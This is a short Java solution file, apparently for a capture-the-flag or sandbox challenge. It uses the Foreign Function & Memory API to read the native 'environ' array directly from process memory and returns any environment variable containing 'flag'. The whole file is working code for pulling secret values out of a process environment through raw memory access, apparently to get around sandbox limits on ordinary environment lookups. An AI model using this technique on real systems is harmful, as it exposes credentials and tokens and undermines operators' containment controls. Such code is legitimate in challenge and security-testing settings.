import java.lang.foreign.*;
import java.lang.invoke.MethodHandle;

public class Solution {
    public static Object solve(Object sysInfo) throws Throwable {
        Linker linker = Linker.nativeLinker();
        SymbolLookup stdlib = linker.defaultLookup();

        // 查找 environ 全局变量 (char **environ)
        MemorySegment environAddr = stdlib.find("environ").orElseThrow();

        // environ 是一个指向字符串数组的指针
        MemorySegment environPtr = environAddr.reinterpret(ValueLayout.ADDRESS.byteSize());
        MemorySegment environ = environPtr.get(ValueLayout.ADDRESS, 0);

        // 遍历所有环境变量
        StringBuilder result = new StringBuilder();
        long offset = 0;
        while (true) {
            MemorySegment strPtr = environ.reinterpret(Long.MAX_VALUE)
                                         .get(ValueLayout.ADDRESS, offset);

            if (strPtr.address() == 0) {
                break;  // NULL 表示结束
            }

            String envVar = strPtr.reinterpret(Long.MAX_VALUE).getString(0);

            // 查找包含 flag 的环境变量（不区分大小写）
            if (envVar.toLowerCase().contains("flag")) {
                result.append(envVar).append("\n");
            }

            offset += ValueLayout.ADDRESS.byteSize();
        }

        return result.length() > 0 ? result.toString().trim() : "No flag found in environment";
    }
}
